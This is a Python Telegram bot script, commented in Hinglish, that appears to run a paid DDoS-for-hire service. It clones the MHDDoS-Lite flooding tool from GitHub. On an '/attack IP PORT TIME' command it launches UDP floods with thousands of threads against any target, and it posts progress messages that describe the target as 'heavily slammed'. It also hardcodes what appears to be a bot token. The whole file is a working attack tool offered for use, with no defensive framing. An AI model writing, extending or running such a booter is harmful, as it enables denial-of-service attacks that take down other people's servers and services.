import telebot
import subprocess
import threading
import time
import random
import os
from telebot import types
import json # Packet complexity ke liye

# --- CONFIG ---
TOKEN = '8676988617:AAF8sRBKuScBqbWP23ggZRrerAGabu0dfCw'
ADMIN_ID = 6075779781 
bot = telebot.TeleBot(TOKEN)

# Temporary memory
users = {6075779781: 9999999999}
keys = {}

# --- ENGINE SETUP (FIXED) ---
if not os.path.exists("start.py"):
    # Hum seedha root directory mein install kar rahe hain
    os.system("git clone https://github.com/Grizzly-Anis/MHDDoS-Lite.git .")

def get_progress_bar(percent):
    bar_length = 10
    filled = int(percent / 10)
    return "🔥" * filled + "🌑" * (bar_length - filled)

# --- ADVANCE POWER ATTACK LOGIC ---
def run_attack(ip, port, duration, chat_id, message_id, username):
    # POWER UP: Threads ko extreme level par rakhenge
    threads = random.randint(7000, 9000)
    
    # POWER UP: Advanced Complex Methods Try Karenge
    # Basic UDP ko game server block karte hain. Hum heavy flood methods use karenge.
    # Kuch engines mein 'STORM', 'AVALANCHE', ya 'BYPASS' method hota hai.
    # MHDDoS-Lite mein hum MULTIPLE high-intensity UDP flooder lagayenge.
    methods = ["UDP-RAW", "UDP-洪水", "UDP-PREMIUM"] # Backups agar ek fail ho
    method = random.choice(methods)
    
    # Complex packet simulation (Server confuse karne ke liye)
    packet_size = random.randint(1024, 1450) # Bada packet size

    command = f"python3 start.py {method} {ip} {port} {threads} {duration} {packet_size}"
    
    try:
        # Popen use karenge taaki bot freeze na ho
        process = subprocess.Popen(command, shell=True)
        start_time = time.time()
        
        while time.time() - start_time < duration:
            elapsed = time.time() - start_time
            remaining = int(duration - elapsed)
            percent = min(100, int((elapsed / duration) * 100))
            bar = get_progress_bar(percent)
            
            try:
                # Har 4-5 second mein message edit
                bot.edit_message_text(
                    chat_id=chat_id, message_id=message_id,
                    text=(f"🚀 **VVIP POWER ATTACK ACTIVE** 🚀\n"
                          f"━━━━━━━━━━━━━━━━━━━━━━\n"
                          f"👤 **Attacker:** `@{username}`\n"
                          f"🎯 **Target:** `{ip}:{port}`\n"
                          f"⏳ **Remaining:** `{remaining}s` / `{duration}s`\n"
                          f"📊 **Power:** `{bar} {percent}%` \n"
                          f"🔰 **Mode:** `{method}-HIGH-INTENSITY` \n"
                          f"━━━━━━━━━━━━━━━━━━━━━━"),
                    parse_mode="Markdown"
                )
            except: pass
            time.sleep(4)

        process.terminate()
        bot.send_message(chat_id, f"✅ **ATTACK FINISHED!**\nTarget `{ip}` was heavily slammed. 💥")
    except Exception as e:
        bot.send_message(chat_id, f"❌ Error: {str(e)}")

# --- BAKI HANDLERS (SAME) ---
def main_menu():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add('🚀 Start VVIP Attack', '👤 My Profile', '🔑 Redeem Key')
    return markup

@bot.message_handler(commands=['start'])
def welcome(m):
    if m.from_user.id in users or m.from_user.id == ADMIN_ID:
        bot.send_message(m.chat.id, f"💀 **Welcome Boss! Ready to Hammer?**", reply_markup=main_menu())
    else:
        bot.send_message(m.chat.id, "🚫 **ACCESS DENIED!** Contact @FLEXOP01")

@bot.message_handler(commands=['genkey'])
def gen(m):
    if m.from_user.id != ADMIN_ID: return
    try:
        days = int(m.text.split()[1])
        key = f"RIDER-{random.randint(1000, 9999)}"
        keys[key] = days
        bot.send_message(m.chat.id, f"🔑 **VVIP KEY**\n`/redeem {key}`")
    except: pass

@bot.message_handler(commands=['redeem'])
def redeem(m):
    try:
        k = m.text.split()[1]
        if k in keys:
            users[m.from_user.id] = time.time() + (keys[k]*86400)
            del keys[k]
            bot.send_message(m.chat.id, "🎉 **Success!**", reply_markup=main_menu())
    except: pass

@bot.message_handler(func=lambda m: m.text == '🚀 Start VVIP Attack')
def guide(m):
    bot.reply_to(m, "🚀 **Format:** `/attack IP PORT TIME` \nEx: `/attack 1.1.1.1 80 60`")

@bot.message_handler(func=lambda m: m.text == '👤 My Profile')
def profile(m):
    bot.send_message(m.chat.id, f"👤 ID: `{m.from_user.id}`\n📊 Status: Active ✅")

@bot.message_handler(commands=['attack'])
def handle_attack(m):
    if m.from_user.id in users or m.from_user.id == ADMIN_ID:
        try:
            p = m.text.split()
            if len(p) < 4:
                bot.reply_to(m, "Format: `/attack IP PORT TIME`")
                return
            sent = bot.reply_to(m, "📡 **MAX POWER LOADING... ⚡**")
            threading.Thread(target=run_attack, args=(p[1], int(p[2]), int(p[3]), m.chat.id, sent.message_id, m.from_user.username)).start()
        except: pass

print("🚀 Full Power Bot Live!")
bot.infinity_polling()
    
